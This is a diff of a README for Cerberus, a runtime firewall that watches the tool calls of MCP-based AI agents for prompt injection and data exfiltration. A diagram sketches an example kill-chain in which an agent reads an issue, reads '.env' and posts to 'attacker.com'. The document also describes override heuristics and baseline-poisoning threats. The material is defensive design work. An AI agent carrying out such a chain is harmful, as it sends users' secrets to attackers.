@@ -1,6 +1,7 @@
 # Cerberus 🛡️
 ### *Runtime Behavioral Firewall & Forensic Zero-Trust Control Plane for MCP-Based AI Agents*
 
+[![Live Demo](https://img.shields.io/badge/Live%20Demo-Render%20Cloud-6654E8.svg?logo=render&logoColor=white)](https://cerberus-firewall.onrender.com)
 [![CI Build](https://github.com/Debddj/Cerberus/actions/workflows/ci.yml/badge.svg)](https://github.com/Debddj/Cerberus/actions/workflows/ci.yml)
 [![Python](https://img.shields.io/badge/Python-3.12%20%7C%203.14-3776AB.svg?logo=python&logoColor=white)](https://www.python.org/)
 [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-v2%20GA-purple.svg?logo=anthropic&logoColor=white)](https://modelcontextprotocol.io/)
@@ -9,6 +10,11 @@
 [![Audit Security](https://img.shields.io/badge/Ledger-SHA--256%20Hash--Chain-orange.svg)](src/cerberus/proxy/logger.py)
 [![Code Style](https://img.shields.io/badge/Code%20Style-Ruff%20%7C%20Mypy-000000.svg)](https://github.com/astral-sh/ruff)
 [![License](https://img.shields.io/badge/License-Apache--2.0-blue.svg)](LICENSE)
+
+> [!TIP]
+> **Live Cloud Deployment (One-Click Access):** Explore the interactive **Cerberus SOC Console**, **3D Neural Firewall Topology**, and **Live Threat Lab** directly from any browser with zero local setup:
+> **[Launch Cerberus on Render &rarr; https://cerberus-firewall.onrender.com](https://cerberus-firewall.onrender.com)**
+> *(Hosted on Render Free Tier — initial cold start after inactivity may take ~30–45 seconds.)*
 
 > **"mcp-scan asks: *'Is this tool description safe before I connect?'***  
 > **Cerberus asks: *'Does this agent's multi-step sequence trajectory still look like itself over time?'*"**
@@ -19,26 +25,21 @@
 
 The **Model Context Protocol (MCP)** has emerged as the universal connectivity fabric bridging autonomous Large Language Model (LLM) agents with enterprise production systems — file systems, enterprise databases, Git repositories, customer support desks, and external APIs. However, MCP specifies zero runtime behavioral boundaries: **single-event authorization checks cannot distinguish legitimate agent execution from an indirect prompt injection or slow-drip exfiltration kill-chain.**
 
-**Cerberus** is an enterprise-grade, transparent runtime behavioral firewall and security control plane for MCP agents. Operating over both **HTTP JSON-RPC** and **local subprocess Stdio transports**, Cerberus intercepts agent tool calls, scrub sensitive credentials before persistence, continuously scores behavioral drift across a 4-member ensemble (Markov, Isolation Forest, Sequence Transformer, and Rule Floor), enforces dynamic Open Policy Agent (OPA) Rego guardrails, and renders forensic kill-chain narratives in a high-contrast React 18 SOC dashboard.
+**Cerberus** is an enterprise-grade, transparent runtime behavioral firewall and security control plane for MCP agents. Operating over both **HTTP JSON-RPC** and **local subprocess Stdio transports**, Cerberus intercepts agent tool calls, scrubs sensitive credentials before persistence, continuously scores behavioral drift across a 4-member ensemble (Markov, Isolation Forest, Sequence Transformer, and Rule Floor), enforces dynamic Open Policy Agent (OPA) Rego guardrails, and renders forensic kill-chain narratives in a high-contrast React 18 SOC dashboard.
 
-```
-┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
-│                                             MEASURED PERFORMANCE SLA                                             │
-├──────────────────────────────┬───────────────────────────────┬──────────────────┬────────────────────────────────┤
-│ Evaluation Metric            │ Measured Value (95% CI)       │ Industry Target  │ Validation Status              │
-├──────────────────────────────┼───────────────────────────────┼──────────────────┼────────────────────────────────┤
-│ Standard Attack Detection    │ 100.0% (3/3) [43.9%–100.0%]*  │ > 90.0%          │ ✅ Target Met                  │
-│ Adversarial Evasion Catch    │  66.7% (2/3) [20.8%–93.9%]*   │ > 50.0%          │ ✅ Target Met                  │
-│ False Positive Rate (FPR)    │   6.25% (25/400) [4.3%–9.1%]  │ < 10.0%          │ ✅ Production Envelope (Data) │
-│ P50 Runtime Latency Overhead │  12.26 ms                     │ < 15.0 ms        │ ✅ Real-Time Sub-15ms          │
-│ P95 Runtime Latency Overhead │  14.84 ms                     │ < 25.0 ms        │ ✅ Production SLA              │
-│ P99 Runtime Latency Overhead │  44.82 ms                     │ < 50.0 ms        │ ✅ Sub-50ms SLA                │
-│ Automated Test Suite Pass    │  60 / 60 (100%)               │ 100%             │ ✅ Fully Verified              │
-└──────────────────────────────┴───────────────────────────────┴──────────────────┴────────────────────────────────┘
-* Note on Sample Size: Preliminary adversarial replay benchmark evaluated n=3 scenarios per attack category.
-Confidence intervals represent 95% Wilson score intervals. All 25 false positives occurred in the Data Agent archetype
-(25.0% archetype FPR) due to high-variance SQL result payloads; Coding, Support, and Triage archetypes achieved 0.00% FPR.
-```
+### Measured Performance SLA
+
+| Evaluation Metric | Measured Value (95% CI) | Industry Target | Validation Status |
+|:---|:---|:---|:---|
+| **Standard Attack Detection** | `100.0%` (3/3) `[43.9%–100.0%]*` | `> 90.0%` | Target Met |
+| **Adversarial Evasion Catch** | `66.7%` (2/3) `[20.8%–93.9%]*` | `> 50.0%` | Target Met |
+| **False Positive Rate (FPR)** | `6.25%` (25/400) `[4.3%–9.1%]` | `< 10.0%` | Production Envelope (Data) |
+| **P50 Runtime Latency Overhead** | `12.26 ms` | `< 15.0 ms` | Real-Time Sub-15ms |
+| **P95 Runtime Latency Overhead** | `14.84 ms` | `< 25.0 ms` | Production SLA |
+| **P99 Runtime Latency Overhead** | `44.82 ms` | `< 50.0 ms` | Sub-50ms SLA |
+| **Automated Test Suite Pass** | `60 / 60` (100%) | `100%` | Fully Verified |
+
+<sub>*Note on Sample Size: Preliminary adversarial replay benchmark evaluated n=3 scenarios per attack category. Confidence intervals represent 95% Wilson score intervals. All 25 false positives occurred in the Data Agent archetype (25.0% archetype FPR) due to high-variance SQL result payloads; Coding, Support, and Triage archetypes achieved 0.00% FPR.</sub>
 
 ---
 
@@ -55,26 +56,15 @@ $$\text{Evaluate: Is tool } T_i \text{ authorized for Agent } A\text{?}$$
 ```mermaid
 flowchart LR
     subgraph ToxicSequence["The Hidden Threat: Sequence-Level Intent Drift"]
-        C1["Call #1: read_public_issue(#42)
-        ────────────────────────
-        Authorized: Agent routinely
-        inspects bug reports."]
-        
-        C2["Call #2: read_private_repo('.env')
-        ────────────────────────
-        Authorized: Agent has legitimate
-        workspace file access."]
-        
-        C3["Call #3: http_post('attacker.com')
-        ────────────────────────
-        Authorized: Agent routinely
-        posts outgoing webhooks."]
-        
-        C1 -->|Legitimate| C2
-        C2 -->|Legitimate| C3
+        C1["Call #1: read_public_issue #42<br/>Authorized: Agent routinely inspects bug reports."]
+        C2["Call #2: read_private_repo .env<br/>Authorized: Agent has workspace file access."]
+        C3["Call #3: http_post attacker.com<br/>Authorized: Agent routinely posts outgoing webhooks."]
+
+        C1 -->|"Legitimate"| C2
+        C2 -->|"Legitimate"| C3
     end
-    
-    Verdict["⚠️ The Attack Exists Exclusively in the Transition Chain!"]
+
+    Verdict["Warning: The Attack Exists Exclusively in the Transition Chain"]
     ToxicSequence -.-> Verdict
 ```
 
@@ -103,64 +93,44 @@ Cerberus acts as a transparent, high-speed reverse proxy interposed between clie
 ```mermaid
 flowchart TD
     subgraph ClientSpace["Autonomous Agent Loop"]
-        Agent["Autonomous Agent / LLM Client
-        (Claude Desktop, Cursor, Custom Agents)"]
+        Agent["Autonomous Agent / LLM Client<br/>(Claude Desktop, Cursor, Custom Agents)"]
     end
 
     subgraph DualTransport["Cerberus Ingress Layer"]
-        HTTPProxy["FastAPI JSON-RPC Gateway
-        (POST / & POST /mcp)"]
-        StdioProxy["Persistent Stdio Subprocess Proxy
-        (ClientSession Wrapper)"]
+        HTTPProxy["FastAPI JSON-RPC Gateway<br/>(POST / & POST /mcp)"]
+        StdioProxy["Persistent Stdio Subprocess Proxy<br/>(ClientSession Wrapper)"]
     end
 
     subgraph DefensePipeline["Cerberus Multi-Stage Defense Pipeline"]
-        Redactor["Pre-Persistence Secret Redactor
-        (Regex Scrubbing: OpenAI, AWS, GitHub PATs, RSA)"]
+        Redactor["Pre-Persistence Secret Redactor<br/>(Regex Scrubbing: OpenAI, AWS, GitHub PATs, RSA)"]
 
         subgraph PreFlight["Stage 1: Pre-Flight Static Defense"]
-            Pinner["Cryptographic Schema Pinner
-            (SHA-256 Description & Schema Pinning)"]
-            Scope["Scope Analyzer
-            (Per-Agent Permitted Tool Vocabularies)"]
-            Shadow["Shadow Detector
-            (Cross-Server Tool Masquerading Prevention)"]
-            Trifecta["Lethal Trifecta Detector
-            (Private Read + Untrusted Input + Egress)"]
+            Pinner["Cryptographic Schema Pinner<br/>(SHA-256 Description & Schema Pinning)"]
+            Scope["Scope Analyzer<br/>(Per-Agent Permitted Tool Vocabularies)"]
+            Shadow["Shadow Detector<br/>(Cross-Server Tool Masquerading Prevention)"]
+            Trifecta["Lethal Trifecta Detector<br/>(Private Read + Untrusted Input + Egress)"]
         end
 
         subgraph Behavioral["Stage 2: 4-Member Behavioral Ensemble"]
-            Features["Feature Extraction Split
-            (Categorical vs. Continuous Variables)"]
-            RuleFloor["Rule-Based Floor
-            (Zero-Day Call #1 Protection)"]
-            Markov["Markov Chain Scorer
-            (Categorical Transition Surprise)"]
-            IF["Isolation Forest Scorer
-            (Continuous Multivariate z-Scores)"]
-            Transformer["Sequence Transformer
-            (Reconstruction Cross-Entropy Loss)"]
-            Arbiter["Ensemble Arbiter
-            (Circuit Breaker High-Threat Escalation)"]
+            Features["Feature Extraction Split<br/>(Categorical vs. Continuous Variables)"]
+            RuleFloor["Rule-Based Floor<br/>(Zero-Day Call #1 Protection)"]
+            Markov["Markov Chain Scorer<br/>(Categorical Transition Surprise)"]
+            IF["Isolation Forest Scorer<br/>(Continuous Multivariate z-Scores)"]
+            Transformer["Sequence Transformer<br/>(Reconstruction Cross-Entropy Loss)"]
+            Arbiter["Ensemble Arbiter<br/>(Circuit Breaker High-Threat Escalation)"]
         end
 
         subgraph PolicyEngine["Stage 3: Policy Enforcement"]
-            OPA["Open Policy Agent (OPA)
-            Rego v1 Base & Synthesized Rules"]
-            CircuitBreaker["10s Fail-Closed Circuit Breaker
-            (Blocks high-risk calls if OPA is offline)"]
+            OPA["Open Policy Agent (OPA)<br/>Rego v1 Base & Synthesized Rules"]
+            CircuitBreaker["10s Fail-Closed Circuit Breaker<br/>(Blocks high-risk calls if OPA is offline)"]
         end
 
-        Decision{"Policy Arbiter
-        (ALLOW / CHALLENGE / BLOCK / QUARANTINE)"}
+        Decision{"Policy Arbiter<br/>ALLOW / CHALLENGE / BLOCK / QUARANTINE"}
 
         subgraph AuditDefense["Forensics & Tamper-Evident Storage"]
-            Ledger["Cryptographic SHA-256 Hash Chain
-            H[i] = SHA256(index : H[i-1] : CanonicalJSON(E[i]))"]
-            Fernet["Fernet Envelope Encryption at Rest
-            (Audit Log Rotation: 10MB x 5 Segments)"]
-            Narrator["Forensic Narrative Reconstructor
-            (Reconnaissance ➔ Staging ➔ Exfiltration)"]
+            Ledger["Cryptographic SHA-256 Hash Chain<br/>H_i = SHA256(index : H_prev : CanonicalJSON)"]
+            Fernet["Fernet Envelope Encryption at Rest<br/>(Audit Log Rotation: 10MB x 5 Segments)"]
+            Narrator["Forensic Narrative Reconstructor<br/>(Reconnaissance &rarr; Staging &rarr; Exfiltration)"]
         end
     end
 
@@ -172,15 +142,14 @@ flowchart TD
     end
 
     subgraph SOCControlPlane["SOC Observability Plane"]
-        ReactUI["Enterprise React 18 SOC Dashboard
-        (Vite + TailwindCSS + Lucide at /ui)"]
+        ReactUI["Enterprise React 18 SOC Dashboard<br/>(Vite + TailwindCSS + 3D WebGL Topology)"]
         SSEStream["Live Server-Sent Events (/api/events/stream)"]
         Prometheus["Prometheus Metrics Endpoint (/metrics)"]
     end
 
     %% Ingress Flow
-    Agent -->|HTTP JSON-RPC| HTTPProxy
-    Agent -->|Stdio JSON-RPC| StdioProxy
+    Agent -->|"HTTP JSON-RPC"| HTTPProxy
+    Agent -->|"Stdio JSON-RPC"| StdioProxy
 
     HTTPProxy --> Redactor
     StdioProxy --> Redactor
@@ -202,8 +171,8 @@ flowchart TD
     CircuitBreaker --> Decision
 
     %% Decision Outcomes
-    Decision -->|ALLOW| UpstreamEcosystem
-    Decision -->|BLOCK / QUARANTINE| Agent
+    Decision -->|"ALLOW"| UpstreamEcosystem
+    Decision -->|"BLOCK / QUARANTINE"| Agent
     Decision --> Ledger
     Ledger --> Fernet
 
@@ -233,7 +202,7 @@ sequenceDiagram
     activate C
     C->>R: Scrub credentials & compute Shannon entropy
     R-->>C: Sanitized parameters & payload entropy
-    
+
     par Pre-Flight & Behavioral Scoring
         C->>S: Verify Schema Hash, Scope & Lethal Trifecta
         S-->>C: Static risk score & warnings
@@ -249,12 +218,12 @@ sequenceDiagram
         C->>C: Trip 10s Fail-Closed Circuit Breaker (Block if Risk >= 0.70)
     end
 
-    C->>L: Append block: H[i] = SHA256(index:prev_hash:CanonicalJSON(event))
-    
+    C->>L: Append block H_i = SHA256(index:prev_hash:CanonicalJSON)
+
     alt Decision == ALLOW
         C->>U: Forward tools/call request
         U-->>C: Tool response
-        Note over C: ResponseScanner: Scan tool result for indirect prompt injection
+        Note over C: ResponseScanner scans tool result for indirect prompt injection
         C-->>A: Return validated tool response to Agent
     else Decision == CHALLENGE
         C-->>A: Return JSON-RPC Challenge Envelope (Pending Operator Approval)
@@ -371,20 +340,20 @@ class ResponseScanner:
 #### Pipeline Data Flow
 ```mermaid
 flowchart TD
-    Upstream["Upstream MCP Server"] -->|Raw Tool Result| Recv["Cerberus Proxy Ingress"]
+    Upstream["Upstream MCP Server"] -->|"Raw Tool Result"| Recv["Cerberus Proxy Ingress"]
     Recv --> RS["ResponseScanner"]
-    
+
     subgraph ScanPipeline["ResponseScanner Multi-Head Evaluation"]
         RS --> Sig["1. Delimiter & Override Heuristics"]
         RS --> Ent["2. High-Entropy / Base64 Payload Check"]
         RS --> Taint["3. Lethal Trifecta Taint Gating"]
     end
-    
+
     ScanPipeline --> Decision{"Scan Decision"}
-    Decision -->|Safe (Score < 0.40)| Clean["Deliver Raw Result to Agent"]
-    Decision -->|Ambiguous (0.40 <= Score < 0.70)| Sanitized["Wrap in <untrusted_content> Warning"]
-    Decision -->|Hostile Injection (Score >= 0.70)| Block["Security Error (-32002): Response Blocked"]
-    Decision -->|Critical Hijack Attempt (>= 0.90)| Quar["Quarantine Session & Freezes Client"]
+    Decision -->|"Safe: Score &lt; 0.40"| Clean["Deliver Raw Result to Agent"]
+    Decision -->|"Ambiguous: 0.40 to 0.69"| Sanitized["Wrap in &lt;untrusted_content&gt; Warning"]
+    Decision -->|"Hostile Injection: Score &ge; 0.70"| Block["Security Error -32002: Response Blocked"]
+    Decision -->|"Critical Hijack: Score &ge; 0.90"| Quar["Quarantine Session & Freeze Client"]
 ```
 
 #### Proxy Integration Points
@@ -508,25 +477,16 @@ A firewall that does not defend itself becomes an organization's most critical s
 ```mermaid
 flowchart TD
     subgraph MetaSecurity["Cerberus Self-Referential Defense Matrix"]
-        A1["Attack Vector 1: OPA Sidecar DoS / Crash
-        (Adversary attempts to force fail-open bypass)"]
-        M1["Mitigation: Strict Fail-Closed Circuit Breaker
-        High-risk calls (>=0.70) and unbaselined sessions
-        are unconditionally blocked during outages."]
+        A1["Attack Vector 1: OPA Sidecar DoS / Crash<br/>(Adversary attempts to force fail-open bypass)"]
+        M1["Mitigation: Strict Fail-Closed Circuit Breaker<br/>High-risk calls (&ge; 0.70) and unbaselined sessions<br/>are unconditionally blocked during outages."]
         A1 ==> M1
 
-        A2["Attack Vector 2: Audit Storage Exfiltration
-        (Adversary reads logs containing parameters)"]
-        M2["Mitigation: Pre-Persistence Secret Redactor
-        API tokens, private keys & passwords are scrubbed
-        before disk write; log files encrypted with Fernet."]
+        A2["Attack Vector 2: Audit Storage Exfiltration<br/>(Adversary reads logs containing parameters)"]
+        M2["Mitigation: Pre-Persistence Secret Redactor<br/>API tokens, private keys & passwords are scrubbed<br/>before disk write; log files encrypted with Fernet."]
         A2 ==> M2
 
-        A3["Attack Vector 3: Boiling-Frog Baseline Poisoning
-        (Patient adversary slowly skews normal baseline)"]
-        M3["Mitigation: TVD Stability Gating & Versioned Snapshots
-        Contaminated sessions (risk >= 0.40) permanently excluded;
-        TVD > 0.35 rejects automatic snapshot promotion."]
+        A3["Attack Vector 3: Boiling-Frog Baseline Poisoning<br/>(Patient adversary slowly skews normal baseline)"]
+        M3["Mitigation: TVD Stability Gating & Versioned Snapshots<br/>Contaminated sessions (risk &ge; 0.40) permanently excluded;<br/>TVD &gt; 0.35 rejects automatic snapshot promotion."]
         A3 ==> M3
     end
 ```
@@ -548,8 +508,10 @@ Any unauthorized alteration, deletion, or reordering of audit logs on disk immed
 Adversaries often attempt to gradually poison behavioral baselines over weeks. Cerberus prevents this via two mechanisms:
 1. **Contamination Quarantine:** Any session containing even one flagged call ($\text{risk} \ge 0.40$) is permanently excluded from baseline retraining sets.
 2. **Total Variation Distance (TVD) Stability Gate:** Before promoting a new snapshot (`snap_v(n+1)`), Cerberus computes the TVD between the candidate tool distribution $P$ and historical distribution $Q$:
+
    $$\delta(P, Q) = \frac{1}{2} \sum_{x \in \mathcal{X}} |P(x) - Q(x)|$$
-   If $\delta(P, Q) \gt 0.35$, promotion is aborted and alerted to the SOC.
+
+   If $\delta(P, Q) > 0.35$, promotion is aborted and alerted to the SOC.
 
 ---
 
@@ -688,6 +650,13 @@ Launch mock upstream servers, OPA sidecar, Cerberus gateway, and dashboard via D
 docker compose up -d
 ```
 
+### Step 6: Zero-Cost Cloud Deployment (Render)
+
+Cerberus includes a multi-stage [`Dockerfile`](Dockerfile) and [`render.yaml`](render.yaml) blueprint that compiles the React frontend and serves both the MCP proxy and SOC dashboard from a single container:
+
+- **Live Instance:** [https://cerberus-firewall.onrender.com](https://cerberus-firewall.onrender.com)
+- **Health Endpoint:** [`/healthz`](https://cerberus-firewall.onrender.com/healthz)
+
 ---
 
 ## 9. CLI Reference & REST API Catalog
@@ -744,10 +713,13 @@ Cerberus directly maps to and mitigates threats defined across industry agentic 
 ```
 cerberus/
 ├── .github/workflows/ci.yml       # Automated GitHub Actions CI (Ruff, Mypy, Pytest, Coverage)
-├── Dockerfile                     # Proxy gateway & React frontend container image
-├── Dockerfile.dashboard           # (Deprecated) Legacy Streamlit SOC dashboard; see frontend/ for primary React UI
+├── Cerberus_Project_Overview.pdf  # Comprehensive technical & executive project overview
+├── Dockerfile                     # Multi-stage proxy gateway & React frontend container image
+├── Dockerfile.dashboard           # (Deprecated) Legacy Streamlit SOC dashboard; see frontend/
 ├── docker-compose.yml             # Sandbox multi-tier lab orchestration
+├── docker-compose.dev.yml         # Local development orchestration override
 ├── pyproject.toml                 # uv package definition, metadata, and dependencies
+├── render.yaml                    # Render Blueprint for zero-cost cloud deployment
 │
 ├── docs/                          # Comprehensive Engineering Specifications
 │   ├── ablation-report.md         # Detailed 5-way model ablation study results
@@ -765,14 +737,15 @@ cerberus/
 │
 ├── frontend/                      # Enterprise React 18 SOC Dashboard
 │   ├── src/
-│   │   ├── components/            # SOC Views: EventStream, AttackChain, Policies,
-│   │   │                          # Baselines, AuditLedger, Telemetry, Navbar
-│   │   ├── api.ts                 # Axios & SSE API client integration
-│   │   ├── types.ts               # Strict TypeScript domain interfaces
-│   │   ├── App.tsx                # Dashboard view router & layout container
+│   │   ├── components/            # 3D WebGL Firewall Canvas, Attack Replay Theater,
+│   │   │                          # Brand Assets, Layout Shell, SOC Telemetry Views
+│   │   ├── pages/                 # Public Showcase (Landing, Architecture, Threat Lab, Docs)
+│   │   │                          # & Authenticated SOC Dashboard Views
+│   │   ├── context/               # Auth, Theme, Telemetry, and Toast State Providers
+│   │   ├── services/              # API client & SSE live streaming adapters
+│   │   ├── App.tsx                # Application router & layout shell
 │   │   └── main.tsx               # React entrypoint
-│   ├── dist/                      # Pre-compiled static assets served by FastAPI
-│   ├── package.json               # Frontend dependencies (React, Vite, TailwindCSS)
+│   ├── package.json               # Frontend dependencies (React, Three.js, Vite, TailwindCSS)
 │   └── vite.config.ts             # Vite build & development server configuration
 │
 ├── policies/                      # Open Policy Agent (OPA) Guardrails
